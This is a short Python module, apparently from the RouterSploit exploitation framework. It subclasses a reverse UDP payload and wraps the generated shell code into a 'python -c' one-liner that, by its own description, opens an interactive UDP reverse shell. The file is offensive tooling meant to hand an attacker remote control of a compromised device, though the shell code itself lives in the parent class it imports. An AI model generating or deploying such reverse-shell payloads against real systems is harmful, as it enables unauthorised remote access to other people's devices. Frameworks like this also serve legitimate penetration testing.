from routersploit.core.exploit import *
from routersploit.modules.payloads.python.reverse_udp import Payload as PythonBindUDP


class Payload(PythonBindUDP):
    __info__ = {
        "name": "Python Reverse UDP One-Liner",
        "description": "Creates interactive udp reverse shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        )
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        payload = super(Payload, self).generate()

        cmd = '{} -c "{}"'.format(self.cmd, payload)
        return cmd
